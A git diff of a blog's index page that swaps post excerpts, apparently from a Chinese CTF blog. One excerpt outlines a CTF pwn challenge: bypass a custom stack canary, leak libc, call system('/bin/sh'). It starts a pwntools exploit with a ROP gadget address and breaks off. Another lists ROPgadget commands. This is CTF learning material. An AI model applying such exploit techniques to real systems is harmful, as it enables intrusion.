@@ -491,8 +491,8 @@ IP地址的低23位替换mac地址低</div>
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/23/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4-MyTreasure/">
-        <p class="h4 index-header">Pwn常用指令-MyTreasure</p>
+      <a href="/2019/12/23/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
+        <p class="h4 index-header">Pwn常用指令</p>
         
         
           
@@ -520,22 +520,44 @@ u32(sh.recvuntil(“\xf7”)[-4:]
     
     
     <div class="col-12 col-md-8 m-auto">
-      <a href="/2019/12/23/Pwn%E5%B8%B8%E7%94%A8%E6%8C%87%E4%BB%A4/">
-        <p class="h4 index-header">Pwn常用指令</p>
+      <a href="/2019/12/22/GXY_CTF_my_cannary-%E4%BB%8E%E9%9B%B6%E8%AE%B0%E5%BD%95%E5%A6%82%E4%BD%95%E8%B0%83%E8%AF%95%E5%87%BA%E6%9D%A5/">
+        <p class="h4 index-header">GXY_CTF_my_cannary-从零记录如何调试出来</p>
         
         
           
         
         <div class="index-excerpt" >
-          <div class="index-text mb-1">Pwn常用ldd filename 读取libc
-ROPgadget --binary filename --only &quot;pop|ret&quot; | grep &quot;rdi&quot; 获得pop_rdi_ret
-慢慢补充，哎</div>
+          <div class="index-text mb-1">查看main
+
+进入test()
+
+看见了read，等等先
+
+judge无法反编译，查看汇编
+
+看见了xor rdx,[rbp-8]，以及上图的mov rdx, [rdx] 也就是先讲rdx指针里的数值放在rdx里，再将rdx和rbp-8的那个进行异或，一致则校验成功
+点开read的buf
+
+buf只有30字节
+再看看strings
+
+没有/bin/sh
+所以我们得先绕过栈校验，再leak libc地址，然后再system /bin/sh
+遂写poc
+from pwn import *
+sh = process(&quot;./my_cannary&quot;)
+elf = ELF(&quot;my_cannary&quot;)
+lib = ELF(&quot;/lib/x86_64-linux-gnu/libc.so.6&quot;)
+pop_rdi_ret = 0x0400a43
+start_main = elf.symbols[&#39;main&#39;]
+context.log_level = &quot;debug&quot;
+context.arch = &#39;amd</div>
         </div>
       </a>
 
       <div>
         
-          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-23&nbsp;&nbsp;
+          <i class="iconfont icon-riqi2"></i>&nbsp;2019-12-22&nbsp;&nbsp;
         
         
         
